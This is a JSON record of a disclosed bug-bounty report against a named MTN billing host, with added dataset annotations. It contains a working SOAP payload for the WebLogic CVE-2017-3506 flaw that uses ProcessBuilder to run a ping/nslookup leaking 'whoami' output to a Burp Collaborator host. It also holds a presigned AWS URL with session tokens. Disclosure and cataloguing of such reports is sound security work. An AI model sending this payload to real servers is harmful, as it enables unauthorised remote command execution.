{
  "reported_to": "MTN Group",
  "reported_by": "tounsi_007 ",
  "title": "Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-3506]",
  "content": "\nSummary\nHello. I was able to identify RCE vulnerability due to the outdated Oracle Weblogic instance on https://raebilling.mtn.co.za.\nSteps To Reproduce\nTo reproduce, try this request with BurpSuite\nThis request to the https://raebilling.mtn.co.za/wls-wsat/RegistrationRequesterPortType will trigger Remote OS Command Execution:\nCode 1.20 KiB\n1POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1\n2Host: raebilling.mtn.co.za\n3Content-Type: text/xml\n4User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0,\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,\n6Accept-Languag: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3,\n7Content-Type: text/xml;charset=UTF-8\n8Content-Length: 873\n9\n10<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n11      <soapenv:Header>\n12        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n13          <java>\n14            <object class=\"java.lang.ProcessBuilder\">\n15              <array class=\"java.lang.String\" length=\"3\">\n16                <void index=\"0\">\n17                  <string>/bin/bash</string>\n18                </void>\n19                <void index=\"1\">\n20                  <string>-c</string>\n21                </void>\n22        <void index=\"2\">\n23                  <string>ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net</string>\n24                </void>\n25              </array>\n26              <void method=\"start\"/>\n27            </object>\n28          </java>\n29        </work:WorkContext>\n30      </soapenv:Header>\n31      <soapenv:Body/>\n32    </soapenv:Envelope>\nNote:\nTo reproduce this case with nslookup or ping, fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net host should be replaced by your own Burp Collaborator instance or with your private VPS IP to catch the DNS request\nExample:\nCode 135 Bytes\n1ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net\n2nslookup `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net\n<image_0>\nSuggested Mitigation/Remediation Actions\nPatching WebLogic to the recent version will fix the issue.\nImpact\nThis vulnerability allow an unauthenticated attacker:\nTo perform Remote OS Command Execution\n\n",
  "severity": [
    9.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YMX2yh82zk6CJag92HRB8gry?response-content-disposition=attachment%3B%20filename%3D%22RCE_3506_whoami.png%22%3B%20filename%2A%3DUTF-8%27%27RCE_3506_whoami.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7TQC2VD6%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T201120Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCYDwKXk5Alyw%2B6%2BX%2BlVXoBMf4XmCPCsq5EwXvZPLtgCQIgT%2FrZMWp7e3s3CKA3loVFAhhhXbt%2FTaX3S0aqtxP3aDUqsgUIGxADGgwwMTM2MTkyNzQ4NDkiDJScpqQPy3cyUv4zlyqPBSr6nPfyuLwmw45DDK%2FT5zEBZh27hxvsarhrpINU7peZkWTDJ50AHazM%2F7FxK7Ggbk3RO4v9b%2Fix7IHG7vKHYIp88zvv8SDdB5SbN4eAJ3l7oDs6TIKgdD6a1o%2B0Wn95z7oyrL9ybb4BDUp3oG4wGCgJDrKxhE3OrsoQyW38yGPJ2q%2BaEtAom%2BCR6Lzozu48pKS8JZ5yhVqDdBREfR00o8uT%2B5LxjYK0z7B9DbJzaXGzucqw918zU%2FcNCGf7x4tA1P0rPoNKvDyGlNvFahv7K86Rbfy8Vhg2e8mt4eCuTCgHRnFHNIdJ4W0CtKoxmV%2FTDHkGmVhq92S4OO9dH28ap3nBPbEXhl2tot7zwI32u%2FNyqSbaYHwdfgL5oDPoTiacSeyzEgiSvhCZzUJiPdGoyG5kZ%2FmyHekN%2BCsc2J9nlvGoywZD2uNvs1cQ6q4%2BTbf9mNPWgrTwaYHxTv7FtRExNL8NCq5OzhPAgevBkUjclKjv8DXCHvUzOLikoOrfIZ5MacV9MmCficRevsX13eP1qpkmHRsxWKvpIlRLIR1alhcx83TV7ylzbHbnzRCjcw1tfyNndJ3c5pcHuU3pmrax8ETBLR9ZIU1eObuDhaInzn8JM0vK9e7jiA3hC35si1e6UFoAiysum4sB7FTJd6DGETvrjcWf4barRplQ%2BcN%2FH9EFxsBh49gRR52os49H%2FSWCssFiomopx4UKeke9y7rFiLVp9QGrBSs5sttQ%2B6FmN9TlFnBRLiigGw95vpjQh3iLWIbdWrzq2cG8u42hpA7pcVrnVbbdX6mAP4UK6rC733Ld%2BB0y2yXi7CMbs7PxFxEdw8%2BfcFruwatDvlSZIsAMlYPgkWxvOJy7cemU6JKKcNYwr86LvwY6sQHdH5QGntFNiTGshX463%2BxLxFkye8af3crmCWRzuYrGwuWkalhbznlubOWpcKblYQgmaSubcFkeLHGhe1Nj97yMCKMd%2FuF9D79i9ovcfO0PJY%2FFHBNP6Pc8mFsTaDfsId48c8crslltNM1gtyhNOdqzzEPMM2RlA6enaLl4hUC8DbCZRSCvSPmgCVVYknlzADOx92QDmt3EZ%2Fop6BdkyzmOh04tfZ0YAXvLvRyz%2BTchNRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d9c5e5174c435eb275bb9d49d1c2f53585879b6e760d4f19c302025a4cc736a9"
  },
  "disclosed_date": 1619368620,
  "report_url": "https://hackerone.com/reports/810778",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Send a POST request to https://raebilling.mtn.co.za/wls-wsat/RegistrationRequesterPortType with a crafted SOAP envelope containing a ProcessBuilder object."
    ],
    [
      2,
      "The crafted SOAP envelope includes a command to execute a ping or nslookup with a subdomain containing the output of the 'whoami' command, sent to a Burp Collaborator instance or private VPS."
    ]
  ],
  "vuln_description": "This vulnerability allows remote OS command execution on an outdated Oracle WebLogic server via CVE-2017-3506. An attacker can execute arbitrary commands by sending a specially crafted SOAP request to the WebLogic server's RegistrationRequesterPortType endpoint.",
  "reason": "The attack involves a single, well-documented exploit (CVE-2017-3506) with a straightforward payload. The steps are simple and do not require complex interactions or state manipulation. The exploit is well-known and publicly documented, making it easy to reproduce.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves an unauthenticated RCE via a specific endpoint in Oracle WebLogic, which is not covered by the described methodologies for AuthN/AuthZ bypass or IDOR. The methodologies focus on swapping user sessions or resource IDs within the same application context, not exploiting a specific RCE vulnerability in a server component.",
    "is_detectable": false
  }
}